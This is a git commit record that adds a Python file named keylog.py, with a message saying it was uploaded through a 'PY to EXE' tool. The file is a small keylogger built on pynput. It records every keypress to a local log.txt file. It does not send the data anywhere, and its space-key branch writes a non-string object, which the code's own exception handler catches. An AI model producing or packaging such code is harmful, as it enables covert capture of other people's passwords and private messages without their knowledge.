e77484452c25d272f3db030e100c22b0ab5812e4
unamed666 <52182376+eroge69@users.noreply.github.com>
2025-05-14 14:21:15 +0700

    Upload keylog.py via PY to EXE tool

---
+++ python-files/keylog.py
@@ -0,0 +1,16 @@
+from pynput import keyboard
+
+def on_press(key):
+    with open("log.txt", "a") as f:
+        try:
+            if key == key.space:
+                f.write(key)
+            elif key == key.backspace:
+                f.write(f"-delete-")
+            else:
+                f.write(f"{key.char}")
+        except Exception as error:
+            f.write(f"[{key}, {error}]")
+
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
